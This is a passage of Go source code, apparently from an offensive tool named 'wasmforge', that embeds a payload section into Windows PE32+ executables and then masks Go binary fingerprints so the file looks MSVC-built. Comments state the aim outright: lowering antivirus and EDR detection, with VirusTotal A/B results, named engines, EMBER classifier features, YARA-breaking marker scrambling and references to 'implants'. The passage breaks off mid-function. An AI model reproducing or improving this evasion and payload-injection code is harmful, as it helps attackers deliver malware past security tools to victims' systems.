func addPayloadSection(path string, payload []byte, sectionName string, verbose bool) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("reading PE: %w", err)
	}
	if len(data) < 0x200 {
		return fmt.Errorf("file too small for PE")
	}

	// Parse PE headers.
	peOff := int(binary.LittleEndian.Uint32(data[0x3C:]))
	if peOff+4 > len(data) || string(data[peOff:peOff+4]) != "PE\x00\x00" {
		return fmt.Errorf("invalid PE signature")
	}

	coffOff := peOff + 4
	numSections := int(binary.LittleEndian.Uint16(data[coffOff+2:]))
	sizeOfOptional := int(binary.LittleEndian.Uint16(data[coffOff+16:]))
	optOff := coffOff + 20
	magic := binary.LittleEndian.Uint16(data[optOff:])
	if magic != 0x020B {
		return fmt.Errorf("not PE32+ (magic=0x%04X)", magic)
	}

	secAlign := binary.LittleEndian.Uint32(data[optOff+32:])
	fileAlign := binary.LittleEndian.Uint32(data[optOff+36:])
	sizeOfHeaders := binary.LittleEndian.Uint32(data[optOff+60:])
	secTableOff := optOff + sizeOfOptional
	if secTableOff > len(data) {
		return fmt.Errorf("section table offset %d beyond file size %d", secTableOff, len(data))
	}

	// Find max VA extent across all sections (needed for both paths).
	var maxVAEnd uint32
	for i := 0; i < numSections; i++ {
		off := secTableOff + i*40
		va := binary.LittleEndian.Uint32(data[off+12:])
		vs := binary.LittleEndian.Uint32(data[off+8:])
		if end := va + vs; end > maxVAEnd {
			maxVAEnd = end
		}
	}

	// ── Strategy 1: Replace existing section with matching name ──────
	// Scan section headers for one whose resolved name matches sectionName.
	// This reuses the existing /NNN strtab reference and keeps the header
	// in the debug section cluster (positions 6-12 in typical Go binaries).
	for i := 0; i < numSections; i++ {
		hdrOff := secTableOff + i*40
		existingName := resolveSectionName(data, hdrOff, coffOff)
		if existingName != sectionName {
			continue
		}

		// Found matching section — replace it in-place.
		// The section keeps its position in the header table (no new
		// section added). We update its sizes and VA, then shift all
		// subsequent sections' VAs to accommodate the larger payload.
		origVA := binary.LittleEndian.Uint32(data[hdrOff+12:])
		origVSize := binary.LittleEndian.Uint32(data[hdrOff+8:])

		// New VA-aligned size for our payload.
		newVSize := peAlignUp(uint32(len(payload)), secAlign)
		oldVSize := peAlignUp(origVSize, secAlign)
		vaShift := uint32(0)
		if newVSize > oldVSize {
			vaShift = newVSize - oldVSize
		}

		// Append payload raw data at end of file.
		newRawOff := peAlignUp(uint32(len(data)), fileAlign)
		secRawSize := peAlignUp(uint32(len(payload)), fileAlign)

		// Update this section's header.
		binary.LittleEndian.PutUint32(data[hdrOff+8:], uint32(len(payload)))  // VirtualSize
		binary.LittleEndian.PutUint32(data[hdrOff+16:], secRawSize)           // SizeOfRawData
		binary.LittleEndian.PutUint32(data[hdrOff+20:], newRawOff)            // PointerToRawData

		// Shift all sections AFTER this one by vaShift to prevent VA overlap.
		if vaShift > 0 {
			shiftThreshold := origVA + oldVSize
			for j := 0; j < numSections; j++ {
				jOff := secTableOff + j*40
				jVA := binary.LittleEndian.Uint32(data[jOff+12:])
				if jVA >= shiftThreshold && j != i {
					binary.LittleEndian.PutUint32(data[jOff+12:], jVA+vaShift)
				}
			}

			// Shift data directory RVAs that point into shifted regions.
			// DataDirectory starts at optOff+112 for PE32+, 16 entries × 8 bytes.
			for d := 0; d < 16; d++ {
				ddOff := optOff + 112 + d*8
				if ddOff+8 > len(data) {
					break
				}
				ddRVA := binary.LittleEndian.Uint32(data[ddOff:])
				if d == 4 {
					continue // Security directory uses file offset, not RVA
				}
				if ddRVA >= shiftThreshold && ddRVA != 0 {
					binary.LittleEndian.PutUint32(data[ddOff:], ddRVA+vaShift)
				}
			}

			// Fix up internal RVAs in import directory and base relocations.
			importDirRVA := binary.LittleEndian.Uint32(data[optOff+112+1*8:])   // DataDirectory[1] = Import
			relocDirRVA := binary.LittleEndian.Uint32(data[optOff+112+5*8:])    // DataDirectory[5] = BaseReloc
			relocDirSize := binary.LittleEndian.Uint32(data[optOff+112+5*8+4:])
			fixupImportDirectory(data, importDirRVA, shiftThreshold, vaShift, secTableOff, numSections)
			fixupBaseRelocations(data, relocDirRVA, relocDirSize, shiftThreshold, vaShift, secTableOff, numSections)
		}

		// Append payload data.
		if padNeeded := int(newRawOff) - len(data); padNeeded > 0 {
			data = append(data, make([]byte, padNeeded)...)
		}
		padded := make([]byte, secRawSize)
		copy(padded, payload)
		data = append(data, padded...)

		// Update SizeOfImage.
		var newMaxVAEnd uint32
		for j := 0; j < numSections; j++ {
			jOff := secTableOff + j*40
			jVA := binary.LittleEndian.Uint32(data[jOff+12:])
			jVS := binary.LittleEndian.Uint32(data[jOff+8:])
			if end := jVA + jVS; end > newMaxVAEnd {
				newMaxVAEnd = end
			}
		}
		binary.LittleEndian.PutUint32(data[optOff+56:], peAlignUp(newMaxVAEnd, secAlign))

		if verbose {
			fmt.Fprintf(os.Stderr, "wasmforge: PE payload: replaced section %q (pos %d, %d bytes, VA 0x%X, shift 0x%X)\n",
				sectionName, i, len(payload), origVA, vaShift)
		}

		return os.WriteFile(path, data, 0o755)
	}

	// ── Strategy 2: Insert new section after debug cluster ───────────
	// Find the insertion point: after the last .zdebug_* / .debug_* section
	// but before non-debug sections (.idata, .reloc, .symtab, .rsrc, etc.).
	// The new section gets a VA adjacent to the debug cluster. All sections
	// after the insertion point have their VAs shifted, and all RVA
	// references into those shifted sections are fixed up.
	insertIdx := numSections // default: append at end
	lastDebugIdx := -1
	for i := 0; i < numSections; i++ {
		hdrOff := secTableOff + i*40
		name := resolveSectionName(data, hdrOff, coffOff)
		if strings.HasPrefix(name, ".zdebug_") || strings.HasPrefix(name, ".debug_") {
			lastDebugIdx = i
		}
	}
	if lastDebugIdx >= 0 {
		insertIdx = lastDebugIdx + 1
	}

	newSecHdrEnd := secTableOff + (numSections+1)*40
	if uint32(newSecHdrEnd) > sizeOfHeaders {
		return fmt.Errorf("no room for payload section header (%d > %d)", newSecHdrEnd, sizeOfHeaders)
	}

	nameRef := sectionName
	if len(sectionName) > 8 {
		nameRef, data, err = appendCOFFStringTable(data, coffOff, sectionName, fileAlign)
		if err != nil {
			return fmt.Errorf("extending COFF string table: %w", err)
		}
	}

	// Compute new section's VA right after the last debug section,
	// so it appears adjacent to the debug cluster in VA space.
	var newSecRVA uint32
	if lastDebugIdx >= 0 {
		off := secTableOff + lastDebugIdx*40
		va := binary.LittleEndian.Uint32(data[off+12:])
		vs := binary.LittleEndian.Uint32(data[off+8:])
		newSecRVA = peAlignUp(va+vs, secAlign)
	} else {
		newSecRVA = peAlignUp(maxVAEnd, secAlign)
	}
	secVirtualSize := uint32(len(payload))
	vaShift := peAlignUp(secVirtualSize, secAlign) // VA space consumed

	// shiftThreshold: all RVAs >= this value need += vaShift.
	// This is the VA of the first section being shifted (at insertIdx).
	var shiftThreshold uint32
	if insertIdx < numSections {
		off := secTableOff + insertIdx*40
		shiftThreshold = binary.LittleEndian.Uint32(data[off+12:])
	} else {
		shiftThreshold = 0xFFFFFFFF // nothing to shift
	}

	// ── Phase 1: Fix internal RVA references (before shifting headers).
	// We do this first so rvaToFileOffset works with old VAs.
	numDataDirs := int(binary.LittleEndian.Uint32(data[optOff+108:]))

	// Import directory: descriptor fields + ILT/IAT entries.
	if numDataDirs > 1 {
		importDirRVA := binary.LittleEndian.Uint32(data[optOff+120:])
		if importDirRVA != 0 {
			fixupImportDirectory(data, importDirRVA, shiftThreshold, vaShift, secTableOff, numSections)
		}
	}
	// Resource directory: DATA_ENTRY OffsetToData.
	if numDataDirs > 2 {
		resDirRVA := binary.LittleEndian.Uint32(data[optOff+128:])
		if resDirRVA != 0 {
			fixupResourceDirectory(data, resDirRVA, shiftThreshold, vaShift, secTableOff, numSections)
		}
	}
	// Base relocations: PageRVA in relocation blocks.
	if numDataDirs > 5 {
		relocDirRVA := binary.LittleEndian.Uint32(data[optOff+152:])
		relocDirSize := binary.LittleEndian.Uint32(data[optOff+156:])
		if relocDirRVA != 0 {
			fixupBaseRelocations(data, relocDirRVA, relocDirSize, shiftThreshold, vaShift, secTableOff, numSections)
		}
	}

	// ── Phase 2: Shift data directory RVAs.
	for i := 0; i < numDataDirs && i < 16; i++ {
		if i == 4 {
			continue // Entry 4 (Security/Certificates) is a file offset, not RVA
		}
		ddOff := optOff + 112 + i*8
		rva := binary.LittleEndian.Uint32(data[ddOff:])
		if rva != 0 && rva >= shiftThreshold {
			binary.LittleEndian.PutUint32(data[ddOff:], rva+vaShift)
		}
	}

	// ── Phase 3: Shift section VAs for sections at insertIdx..numSections-1.
	for i := insertIdx; i < numSections; i++ {
		off := secTableOff + i*40
		oldVA := binary.LittleEndian.Uint32(data[off+12:])
		binary.LittleEndian.PutUint32(data[off+12:], oldVA+vaShift)
	}

	// ── Phase 4: Append raw payload data at end of file.
	var maxRawEnd uint32
	for i := 0; i < numSections; i++ {
		off := secTableOff + i*40
		ro := binary.LittleEndian.Uint32(data[off+20:])
		rs := binary.LittleEndian.Uint32(data[off+16:])
		if end := ro + rs; end > maxRawEnd {
			maxRawEnd = end
		}
	}
	newSecRawOff := peAlignUp(maxRawEnd, fileAlign)
	secRawSize := peAlignUp(secVirtualSize, fileAlign)

	padded := make([]byte, secRawSize)
	copy(padded, payload)

	if int(newSecRawOff) > len(data) {
		data = append(data, make([]byte, int(newSecRawOff)-len(data))...)
	} else {
		data = data[:newSecRawOff]
	}
	data = append(data, padded...)

	// ── Phase 5: Insert section header at insertIdx.
	// Shift existing headers from insertIdx..numSections-1 down by 40 bytes.
	insertHdrOff := secTableOff + insertIdx*40
	tailHdrOff := secTableOff + numSections*40
	if insertIdx < numSections {
		copy(data[insertHdrOff+40:tailHdrOff+40], data[insertHdrOff:tailHdrOff])
	}

	// Characteristics 0x42100040 = CNT_INITIALIZED_DATA | ALIGN_1BYTES |
	// MEM_DISCARDABLE | MEM_READ — matches real Go .zdebug_* sections.
	writeSectionHeader(data[insertHdrOff:], nameRef, secVirtualSize, newSecRVA, secRawSize, newSecRawOff, 0x42100040)

	binary.LittleEndian.PutUint16(data[coffOff+2:], uint16(numSections+1))

	// ── Phase 6: Update SizeOfImage (covers all sections including shifted).
	totalSections := numSections + 1
	var finalMaxVAEnd uint32
	for i := 0; i < totalSections; i++ {
		off := secTableOff + i*40
		va := binary.LittleEndian.Uint32(data[off+12:])
		vs := binary.LittleEndian.Uint32(data[off+8:])
		if end := va + vs; end > finalMaxVAEnd {
			finalMaxVAEnd = end
		}
	}
	binary.LittleEndian.PutUint32(data[optOff+56:], peAlignUp(finalMaxVAEnd, secAlign))

	if verbose {
		fmt.Fprintf(os.Stderr, "wasmforge: PE payload: inserted section %q at pos %d (%d bytes, VA 0x%X, shifted %d sections by 0x%X)\n",
			sectionName, insertIdx, len(payload), newSecRVA, numSections-insertIdx, vaShift)
	}

	return os.WriteFile(path, data, 0o755)
}

// resolveSectionName returns the full section name from a 40-byte section
// header, resolving /NNN COFF string table references to their actual values.
func resolveSectionName(data []byte, hdrOff int, coffOff int) string {
	var nameBytes [8]byte
	copy(nameBytes[:], data[hdrOff:hdrOff+8])

	// Check for /NNN COFF string table reference.
	if nameBytes[0] == '/' {
		var offset int
		n, _ := fmt.Sscanf(string(nameBytes[1:]), "%d", &offset)
		if n == 1 {
			symTabPtr := binary.LittleEndian.Uint32(data[coffOff+8:])
			numSymbols := binary.LittleEndian.Uint32(data[coffOff+12:])
			strTabOff := int(symTabPtr) + int(numSymbols)*18

			nameOff := strTabOff + offset
			if nameOff >= 0 && nameOff < len(data) {
				end := nameOff
				for end < len(data) && data[end] != 0 {
					end++
				}
				return string(data[nameOff:end])
			}
		}
	}

	// Direct name (8 bytes, null-terminated).
	end := 0
	for end < 8 && nameBytes[end] != 0 {
		end++
	}
	return string(nameBytes[:end])
}

// appendCOFFStringTable appends a name to the COFF string table and returns
// the "/N" reference to use in the section header. The COFF string table is
// located at PointerToSymbolTable + NumberOfSymbols*18. Its first 4 bytes are
// the table size (including those 4 bytes).
//
// The insertion is padded to fileAlign so that PointerToRawData values for
// sections whose raw data follows the string table remain file-aligned.
func appendCOFFStringTable(data []byte, coffOff int, name string, fileAlign uint32) (string, []byte, error) {
	symTabPtr := binary.LittleEndian.Uint32(data[coffOff+8:])
	numSymbols := binary.LittleEndian.Uint32(data[coffOff+12:])

	if symTabPtr == 0 {
		return "", data, fmt.Errorf("no COFF symbol table present")
	}

	strTabOff := int(symTabPtr) + int(numSymbols)*18
	if strTabOff+4 > len(data) {
		return "", data, fmt.Errorf("COFF string table offset out of range")
	}

	// Read current string table size.
	strTabSize := int(binary.LittleEndian.Uint32(data[strTabOff:]))
	if strTabSize < 4 {
		strTabSize = 4 // Minimum: just the size field.
	}

	// The new name goes at offset strTabSize within the string table.
	newOffset := strTabSize
	nameBytes := append([]byte(name), 0) // null-terminated

	// Pad insertion to fileAlign so subsequent section raw data offsets
	// remain aligned. Without this padding, an N-byte insertion shifts
	// PointerToRawData values by N, breaking file alignment and causing
	// PE structure corruption.
	insertLen := int(peAlignUp(uint32(len(nameBytes)), fileAlign))
	paddedName := make([]byte, insertLen)
	copy(paddedName, nameBytes)

	newStrTabSize := strTabSize + len(nameBytes) // logical size covers only the name

	// The string table is at the end of the symbol table area. We need to
	// insert the padded name bytes at position strTabOff+strTabSize. If
	// there's file data after the string table (section raw data), we splice.
	insertPos := strTabOff + strTabSize
	tail := make([]byte, len(data)-insertPos)
	copy(tail, data[insertPos:])
	data = append(data[:insertPos], paddedName...)
	data = append(data, tail...)

	// Update string table size.
	binary.LittleEndian.PutUint32(data[strTabOff:], uint32(newStrTabSize))

	// Adjust section raw data offsets that point AFTER the insertion.
	sizeOfOptional := int(binary.LittleEndian.Uint16(data[coffOff+16:]))
	optOff := coffOff + 20
	secTableOff := optOff + sizeOfOptional
	numSections := int(binary.LittleEndian.Uint16(data[coffOff+2:]))
	shift := uint32(insertLen)

	for i := 0; i < numSections; i++ {
		off := secTableOff + i*40
		rawOff := binary.LittleEndian.Uint32(data[off+20:])
		if rawOff >= uint32(insertPos) {
			binary.LittleEndian.PutUint32(data[off+20:], rawOff+shift)
		}
	}

	ref := fmt.Sprintf("/%d", newOffset)
	return ref, data, nil
}

// ──────────────────────────────────────────────────────────────────────
// PE RVA fixup helpers — used when inserting a section mid-VA-space
// requires shifting all subsequent section VAs and their RVA references.
// ──────────────────────────────────────────────────────────────────────

// fixupImportDirectory shifts RVAs inside import descriptors and their
// ILT/IAT entries. Only RVAs >= shiftThreshold are adjusted.
func fixupImportDirectory(data []byte, importDirRVA, shiftThreshold, vaShift uint32, secTableOff, numSections int) {
	fileOff, err := rvaToFileOffset(importDirRVA, data, secTableOff, numSections)
	if err != nil {
		return
	}

	for {
		if fileOff+20 > len(data) {
			break
		}
		oft := binary.LittleEndian.Uint32(data[fileOff:])    // OriginalFirstThunk
		name := binary.LittleEndian.Uint32(data[fileOff+12:]) // Name RVA
		ft := binary.LittleEndian.Uint32(data[fileOff+16:])   // FirstThunk

		if oft == 0 && name == 0 && ft == 0 {
			break // null terminator
		}

		// Fix ILT/IAT entries BEFORE shifting the descriptor RVAs
		// (we need the old RVAs for navigation via rvaToFileOffset).
		if oft != 0 {
			fixupILTEntries(data, oft, shiftThreshold, vaShift, secTableOff, numSections)
		}
		if ft != 0 && ft != oft {
			fixupILTEntries(data, ft, shiftThreshold, vaShift, secTableOff, numSections)
		}

		// Now shift the descriptor's own RVA fields.
		if oft != 0 && oft >= shiftThreshold {
			binary.LittleEndian.PutUint32(data[fileOff:], oft+vaShift)
		}
		if name != 0 && name >= shiftThreshold {
			binary.LittleEndian.PutUint32(data[fileOff+12:], name+vaShift)
		}
		if ft != 0 && ft >= shiftThreshold {
			binary.LittleEndian.PutUint32(data[fileOff+16:], ft+vaShift)
		}

		fileOff += 20
	}
}

// fixupILTEntries shifts hint/name RVAs in a PE32+ ILT or IAT array.
func fixupILTEntries(data []byte, arrayRVA, shiftThreshold, vaShift uint32, secTableOff, numSections int) {
	off, err := rvaToFileOffset(arrayRVA, data, secTableOff, numSections)
	if err != nil {
		return
	}

	for {
		if off+8 > len(data) {
			break
		}
		entry := binary.LittleEndian.Uint64(data[off:])
		if entry == 0 {
			break
		}
		if entry&(1<<63) != 0 {
			off += 8
			continue // ordinal import, no RVA to fix
		}
		rva := uint32(entry & 0x7FFFFFFF)
		if rva >= shiftThreshold {
			binary.LittleEndian.PutUint64(data[off:], uint64(rva+vaShift))
		}
		off += 8
	}
}

// fixupResourceDirectory shifts OffsetToData RVAs in resource directory
// DATA_ENTRY nodes. Only RVAs >= shiftThreshold are adjusted.
func fixupResourceDirectory(data []byte, resDirRVA, shiftThreshold, vaShift uint32, secTableOff, numSections int) {
	resBase, err := rvaToFileOffset(resDirRVA, data, secTableOff, numSections)
	if err != nil {
		return
	}
	fixupResourceNode(data, resBase, resBase, shiftThreshold, vaShift)
}

// fixupResourceNode recursively walks a resource directory node, shifting
// DATA_ENTRY OffsetToData RVAs that are >= shiftThreshold.
func fixupResourceNode(data []byte, nodeOff, resBase int, shiftThreshold, vaShift uint32) {
	if nodeOff+16 > len(data) {
		return
	}
	numNameEntries := int(binary.LittleEndian.Uint16(data[nodeOff+12:]))
	numIDEntries := int(binary.LittleEndian.Uint16(data[nodeOff+14:]))
	totalEntries := numNameEntries + numIDEntries

	for i := 0; i < totalEntries; i++ {
		entryOff := nodeOff + 16 + i*8
		if entryOff+8 > len(data) {
			return
		}
		offsetField := binary.LittleEndian.Uint32(data[entryOff+4:])

		if offsetField&0x80000000 != 0 {
			// Subdirectory (offset from resBase).
			subDirOff := resBase + int(offsetField&0x7FFFFFFF)
			fixupResourceNode(data, subDirOff, resBase, shiftThreshold, vaShift)
		} else {
			// DATA_ENTRY (offset from resBase).
			dataEntryOff := resBase + int(offsetField)
			if dataEntryOff+16 > len(data) {
				continue
			}
			rva := binary.LittleEndian.Uint32(data[dataEntryOff:])
			if rva != 0 && rva >= shiftThreshold {
				binary.LittleEndian.PutUint32(data[dataEntryOff:], rva+vaShift)
			}
		}
	}
}

// fixupBaseRelocations shifts PageRVA values in base relocation blocks
// that are >= shiftThreshold.
func fixupBaseRelocations(data []byte, relocDirRVA, relocDirSize, shiftThreshold, vaShift uint32, secTableOff, numSections int) {
	baseOff, err := rvaToFileOffset(relocDirRVA, data, secTableOff, numSections)
	if err != nil {
		return
	}
	endOff := baseOff + int(relocDirSize)
	pos := baseOff
	for pos+8 <= endOff && pos+8 <= len(data) {
		pageRVA := binary.LittleEndian.Uint32(data[pos:])
		blockSize := binary.LittleEndian.Uint32(data[pos+4:])
		if blockSize == 0 {
			break
		}
		if pageRVA != 0 && pageRVA >= shiftThreshold {
			binary.LittleEndian.PutUint32(data[pos:], pageRVA+vaShift)
		}
		pos += int(blockSize)
	}
}

// fixupImportDirectoryResolved shifts RVA fields in import descriptors and
// their ILT/IAT arrays using a per-section resolver function. Unlike
// fixupImportDirectory (which uses a flat threshold/maxShift), this handles
// non-uniform shifts from expanding multiple debug sections.
func fixupImportDirectoryResolved(data []byte, importDirRVA uint32, resolveRVA func(uint32) uint32, secTableOff, numSections int) {
	fileOff, err := rvaToFileOffset(importDirRVA, data, secTableOff, numSections)
	if err != nil {
		return
	}
	for {
		if fileOff+20 > len(data) {
			break
		}
		oft := binary.LittleEndian.Uint32(data[fileOff:])    // OriginalFirstThunk
		name := binary.LittleEndian.Uint32(data[fileOff+12:]) // Name RVA
		ft := binary.LittleEndian.Uint32(data[fileOff+16:])   // FirstThunk

		if oft == 0 && name == 0 && ft == 0 {
			break // null terminator
		}

		// Fix ILT/IAT entries BEFORE shifting descriptor RVAs
		// (we need old RVAs for navigation via rvaToFileOffset).
		if oft != 0 {
			fixupILTEntriesResolved(data, oft, resolveRVA, secTableOff, numSections)
		}
		if ft != 0 && ft != oft {
			fixupILTEntriesResolved(data, ft, resolveRVA, secTableOff, numSections)
		}

		// Shift descriptor's own RVA fields.
		if oft != 0 {
			if newOFT := resolveRVA(oft); newOFT != oft {
				binary.LittleEndian.PutUint32(data[fileOff:], newOFT)
			}
		}
		if name != 0 {
			if newName := resolveRVA(name); newName != name {
				binary.LittleEndian.PutUint32(data[fileOff+12:], newName)
			}
		}
		if ft != 0 {
			if newFT := resolveRVA(ft); newFT != ft {
				binary.LittleEndian.PutUint32(data[fileOff+16:], newFT)
			}
		}

		fileOff += 20
	}
}

// fixupILTEntriesResolved shifts hint/name RVAs in a PE32+ ILT or IAT array
// using a per-section resolver function.
func fixupILTEntriesResolved(data []byte, arrayRVA uint32, resolveRVA func(uint32) uint32, secTableOff, numSections int) {
	off, err := rvaToFileOffset(arrayRVA, data, secTableOff, numSections)
	if err != nil {
		return
	}
	for {
		if off+8 > len(data) {
			break
		}
		entry := binary.LittleEndian.Uint64(data[off:])
		if entry == 0 {
			break
		}
		if entry&(1<<63) != 0 {
			off += 8
			continue // ordinal import, no RVA to fix
		}
		rva := uint32(entry & 0x7FFFFFFF)
		if newRVA := resolveRVA(rva); newRVA != rva {
			binary.LittleEndian.PutUint64(data[off:], uint64(newRVA))
		}
		off += 8
	}
}

// fixupBaseRelocationsResolved shifts PageRVA values in base relocation blocks
// using a per-section resolver function.
func fixupBaseRelocationsResolved(data []byte, relocDirRVA, relocDirSize uint32, resolveRVA func(uint32) uint32, secTableOff, numSections int) {
	baseOff, err := rvaToFileOffset(relocDirRVA, data, secTableOff, numSections)
	if err != nil {
		return
	}
	endOff := baseOff + int(relocDirSize)
	pos := baseOff
	for pos+8 <= endOff && pos+8 <= len(data) {
		pageRVA := binary.LittleEndian.Uint32(data[pos:])
		blockSize := binary.LittleEndian.Uint32(data[pos+4:])
		if blockSize == 0 {
			break
		}
		if newPageRVA := resolveRVA(pageRVA); newPageRVA != pageRVA {
			binary.LittleEndian.PutUint32(data[pos:], newPageRVA)
		}
		pos += int(blockSize)
	}
}

// fixupResourceDirectoryResolved shifts OffsetToData RVAs in resource directory
// DATA_ENTRY nodes using a per-section resolver function.
func fixupResourceDirectoryResolved(data []byte, resDirRVA uint32, resolveRVA func(uint32) uint32, secTableOff, numSections int) {
	resBase, err := rvaToFileOffset(resDirRVA, data, secTableOff, numSections)
	if err != nil {
		return
	}
	// Resource section size from data directory entry is not passed here,
	// so use a generous upper bound. Resource trees are 3 levels deep
	// (type → name → language); depth limit prevents runaway recursion
	// if the parser wanders into non-resource data.
	fixupResourceNodeResolved(data, resBase, resBase, resolveRVA, 0)
}

// fixupResourceNodeResolved recursively walks a resource directory node,
// shifting DATA_ENTRY OffsetToData RVAs using a per-section resolver.
// Depth is limited to 5 levels (real PE resources are 3 levels deep).
func fixupResourceNodeResolved(data []byte, nodeOff, resBase int, resolveRVA func(uint32) uint32, depth int) {
	if depth > 5 || nodeOff < resBase || nodeOff+16 > len(data) {
		return
	}
	numNameEntries := int(binary.LittleEndian.Uint16(data[nodeOff+12:]))
	numIDEntries := int(binary.LittleEndian.Uint16(data[nodeOff+14:]))
	totalEntries := numNameEntries + numIDEntries
	// Sanity: real resource dirs have < 100 entries at any level.
	if totalEntries > 100 {
		return
	}

	for i := 0; i < totalEntries; i++ {
		entryOff := nodeOff + 16 + i*8
		if entryOff+8 > len(data) {
			return
		}
		offsetField := binary.LittleEndian.Uint32(data[entryOff+4:])

		if offsetField&0x80000000 != 0 {
			// Subdirectory (offset from resBase).
			subDirOff := resBase + int(offsetField&0x7FFFFFFF)
			if subDirOff <= nodeOff {
				continue // backward reference → cycle, skip
			}
			fixupResourceNodeResolved(data, subDirOff, resBase, resolveRVA, depth+1)
		} else {
			// DATA_ENTRY (offset from resBase).
			dataEntryOff := resBase + int(offsetField)
			if dataEntryOff+16 > len(data) {
				continue
			}
			rva := binary.LittleEndian.Uint32(data[dataEntryOff:])
			if newRVA := resolveRVA(rva); newRVA != rva {
				binary.LittleEndian.PutUint32(data[dataEntryOff:], newRVA)
			}
		}
	}
}

// ──────────────────────────────────────────────────────────────────────
// Go PE fingerprint masking — makes the binary look like MSVC-compiled
// ──────────────────────────────────────────────────────────────────────

// normalizeGoPEHeaders modifies ONLY cosmetic PE header fields to make the
// binary look more like an MSVC-compiled PE. Does NOT touch Go runtime
// metadata (gopclntab, build info) — zeroing those was tested and INCREASED
// detections because classifiers see inconsistency as tampering.
//
// Safe changes (cosmetic, no runtime impact):
//  1. LinkerVersion: 3.0 → 14.x (MSVC 2022 range)
//  2. TimeDateStamp: 0 → realistic recent timestamp
//  3. COFF SymbolTable pointer/count: zero out (Go leaves populated; MSVC doesn't)
//  4. Section names: /4, /19, /32... → .debug_ab, .debug_in, etc.
//  5. .symtab section: rename to .bss2, zero size
//  6. StackReserve: 2MB → 1MB (MSVC default)
//
// NOT touched (would cause tampering signal):
//  - gopclntab magic bytes
//  - \xff Go buildinf: marker
//  - Go version strings
//  - Any .rdata content
func normalizeGoPEHeaders(data []byte, verbose bool) []byte {
	if len(data) < 0x200 {
		return data
	}

	peOff := int(binary.LittleEndian.Uint32(data[0x3C:]))
	if peOff+0x78 > len(data) {
		return data
	}

	optOff := peOff + 24
	magic := binary.LittleEndian.Uint16(data[optOff:])
	if magic != 0x20b {
		return data // Only PE32+ (64-bit)
	}

	changes := 0

	// 1. Linker version: Go=3.0, MSVC=14.x. EMBER's #2 feature by SHAP value.
	if data[optOff+2] < 10 {
		data[optOff+2] = 14
		data[optOff+3] = byte(16 + cryptoRandN(20)) // Minor: 16-35
		changes++
	}

	// 2. TimeDateStamp: Go=0, MSVC=compile time. EMBER's #1 feature.
	// Compass Security: changing this alone drops EMBER score 0.999→0.018.
	tsOff := peOff + 8
	if binary.LittleEndian.Uint32(data[tsOff:]) == 0 {
		base := uint32(1704067200) // 2024-01-01
		binary.LittleEndian.PutUint32(data[tsOff:], base+uint32(cryptoRandN(63158400)))
		changes++
	}

	// 3. COFF SymbolTable: Go populates; MSVC release builds zero these.
	symOff := peOff + 12
	if binary.LittleEndian.Uint32(data[symOff:]) > 0 || binary.LittleEndian.Uint32(data[symOff+4:]) > 0 {
		binary.LittleEndian.PutUint32(data[symOff:], 0)
		binary.LittleEndian.PutUint32(data[symOff+4:], 0)
		changes++
	}

	// 4. StackReserve: Go=2MB, MSVC=1MB.
	stackResOff := optOff + 72
	if binary.LittleEndian.Uint64(data[stackResOff:]) == 0x200000 {
		binary.LittleEndian.PutUint64(data[stackResOff:], 0x100000)
		changes++
	}

	// 5. Section names: Go uses /N (COFF string table offsets) for debug sections.
	// MSVC uses .debug_info, .debug_line, etc. Rename to match.
	numSections := int(binary.LittleEndian.Uint16(data[peOff+6:]))
	optHdrSize := int(binary.LittleEndian.Uint16(data[peOff+20:]))
	sectionOff := peOff + 24 + optHdrSize

	debugNames := []string{
		".debug_ab", ".debug_in", ".debug_li", ".debug_fr",
		".debug_ra", ".debug_lo", ".debug_pu", ".debug_ty",
	}
	debugIdx := 0

	for i := 0; i < numSections && i < 96; i++ {
		nameOff := sectionOff + i*40
		if nameOff+8 > len(data) {
			break
		}
		sname := string(data[nameOff : nameOff+8])

		// Numeric section name → DWARF-style name
		if sname[0] == '/' && debugIdx < len(debugNames) {
			copy(data[nameOff:nameOff+8], []byte{0, 0, 0, 0, 0, 0, 0, 0})
			copy(data[nameOff:], []byte(debugNames[debugIdx]))
			debugIdx++
			changes++
		}

		// .symtab → .bss (Go-specific; MSVC never has this).
		// .bss is the standard uninitialized-data section name. The
		// previous choice of .bss2 was itself a wasmforge fingerprint:
		// across a 25-sample VT control, six AV engines (F-Secure,
		// Avira, AVG, Avast, Cynet, MalwareX-gen) matched it. A 19-
		// sample A/B with only this change dropped mean detection from
		// 6.32/74 → 1.58/74 (8.5% → 2.1%) with those six engines
		// stopping completely. ESET WinGo/WasmForge.A still fires —
		// keys on something else — but losing the AV cluster is a win.
		if strings.TrimRight(sname, "\x00") == ".symtab" {
			binary.LittleEndian.PutUint32(data[nameOff+16:], 0) // zero SizeOfRawData
			copy(data[nameOff:nameOff+8], []byte(".bss\x00\x00\x00\x00"))
			changes++
		}
	}

	if verbose && changes > 0 {
		fmt.Fprintf(os.Stderr, "wasmforge: normalized %d Go PE header fields (safe changes only)\n", changes)
	}

	return data
}

// scrambleGoMarkers scrambles Go runtime identity markers in a PE binary:
//   - "\xff Go build ID: " (universal Go binary signature at start of .text)
//   - "\xff Go buildinf:"  (Go build info structure containing module deps)
// These markers are present at predictable offsets in every Go binary and
// may serve as anchors for CrowdStrike's BR (byte-pattern) signatures.
//
// VT R53 analysis (2026-06-12) confirmed all samples contain "\xff Go build ID: "
// at file offset 1536 with a 110-char hash payload, plus "\xff Go buildinf:"
// containing module dependencies.
//
// Scrambling strategy:
//   - Replace marker prefix with random bytes (breaks YARA prefix match)
//   - Replace hash payload with random ASCII (breaks hash-based fingerprint)
//   - Preserve length to avoid PE structure corruption
//
// Limitations: debug.ReadBuildInfo() will return invalid data. Most implants
// don't call this. Symbol table is already stripped via -ldflags "-s -w".
func scrambleGoMarkers(path string, verbose bool) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("reading PE: %w", err)
	}

	changes := 0

	// Marker 1: "\xff Go build ID: \""
	buildIDPrefix := []byte("\xff Go build ID: \"")
	if idx := bytes.Index(data, buildIDPrefix); idx >= 0 {
		// Find end of payload (terminated by "\x00 or similar)
		payloadStart := idx + len(buildIDPrefix)
		// Find end: payload is base64-like chars, terminated by '"' followed by some structure.
		// Locate the closing quote (must be within ~200 chars of start).
		payloadEnd := payloadStart
		for i := payloadStart; i < payloadStart+200 && i < len(data); i++ {
			if data[i] == '"' {
				payloadEnd = i
				break
			}
		}
		if payloadEnd > payloadStart {
			// Randomize the prefix bytes (preserve some structure for runtime parsing).
			// Replace "\xff Go build ID: \"" with random bytes that don't look like Go.
			randPrefix := make([]byte, len(buildIDPrefix))
